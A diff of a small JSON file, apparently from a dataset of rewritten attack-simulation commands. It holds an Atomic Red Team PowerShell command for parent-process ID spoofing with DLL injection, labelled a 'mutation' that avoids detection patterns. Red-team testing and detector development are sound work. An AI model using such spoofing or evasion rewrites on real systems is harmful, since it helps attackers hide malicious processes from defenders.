@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "powershell.exe -Command \"& { . 'C:\\AtomicRedTeam\\atomics\\T1134.004\\src\\PPID-Spoof.ps1'; $ppid = Get-Process explorer | Select-Object -ExpandProperty Id; PPID-Spoof -ppid $ppid -spawnto 'C:\\Program Files\\Internet Explorer\\iexplore.exe' -dllpath 'C:\\AtomicRedTeam\\atomics\\T1134.004\\bin\\calc.dll' }\"",
@@ -13,4 +12,3 @@
     "explanation": "The command is restructured by using the -Command parameter and removing unnecessary quotes. The Select-Object cmdlet is replaced with its shorthand Select, which is functionally equivalent. This is a safe mutation that avoids direct invocation patterns."
   }
 ]
-```
